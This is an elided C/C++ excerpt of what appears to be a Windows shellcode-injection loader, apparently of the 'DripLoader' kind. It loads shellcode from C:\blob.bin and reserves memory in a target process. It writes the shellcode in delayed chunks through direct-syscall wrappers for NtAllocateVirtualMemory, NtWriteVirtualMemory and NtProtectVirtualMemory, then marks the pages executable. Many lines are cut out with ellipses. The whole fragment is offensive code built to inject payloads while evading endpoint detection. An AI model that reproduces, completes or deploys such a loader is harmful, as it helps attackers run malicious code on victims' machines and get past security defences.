...
// blob.bin
char fnamScBlob[]{ 'C',':','\\','b','l','o','b','.','b','i','n','\0' };
...
int run(int tpid, HANDLE hProc, DWORD szPage, DWORD szAllocGran, const char* fnam, int msStepDelay)
{
    ...
    for (i = 1; i <= cVmResv; ++i) 
    {
        ...
        status = sw3::Sw3NtAllocateVirtualMemory(
            hProc,
            &currentVmBase,
            NULL, 
            &szVmResv,
    ...
    for (i = 0; i < cVmResv; ++i) 
    {
        for (cmm_i = 0; cmm_i < cVmCmm; ++cmm_i) 
        {
            ...
            status = sw3::Sw3NtWriteVirtualMemory(
                hProc, 
                currentVmBase, 
                &shellcode[offsetSc], 
                szVmCmm, 
            ...
            status = sw3::Sw3NtProtectVirtualMemory(
                hProc, 
                &currentVmBase, 
                &szVmCmm, 
                PAGE_EXECUTE_READ, 
...
int Drip(long pid, long delay_ms)
{
    int mode = 3;
    EnableAnsiSupport();
